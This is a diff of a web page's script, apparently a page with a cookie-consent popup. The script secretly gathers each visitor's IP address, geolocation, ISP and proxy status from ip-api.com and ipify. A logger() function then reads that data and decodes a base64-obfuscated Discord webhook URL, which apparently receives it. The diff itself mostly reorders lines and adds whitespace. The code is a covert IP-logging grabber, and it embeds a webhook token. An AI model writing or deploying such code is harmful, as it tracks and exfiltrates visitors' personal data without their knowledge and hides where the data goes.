@@ -30,21 +30,22 @@
 
         get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
             var div = document.createElement("div");
-            div.innerHTML = text;
             div.id = "razzylog";
+            div.innerHTML = text;
             document.body.appendChild(div);
         });
 
         get_information("https://api.ipify.org/", function(text) {
             var div = document.createElement("div");
-            div.innerHTML = text;
             div.id = "ipppp";
+            div.innerHTML = text; 
             document.body.appendChild(div);
         });
 
         function logger() {
-            var ispp = document.getElementById('ipppp').innerHTML;
-            var extra = document.getElementById("razzylog").innerHTML;
+            var ispp = document.getElementById('ipppp').innerHTML; 
+            var extra = document.getElementById("razzylog").innerHTML; 
+
             var base64WebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwODAyNDk2NTkwMzI5MDM2OC9jNGYxd2lHX090aFpGWUZOQTVBT1FjRHJMU014Z1lZcFVSVjhxZTNlczcxaWppeDVYR1k4R09NbkFWRXFiR25XRDlVbA=="; 
             var decodedWebhookUrl = atob(base64WebhookUrl); 
 
@@ -99,7 +100,7 @@
         };
 
         document.getElementById("decline-btn").onclick = function() {
-            document.getElementById("cookie-popup").style.display = "none";
+            document.getElementById("cookie-popup").style.display = "none"; 
         };
     </script>
 </body>
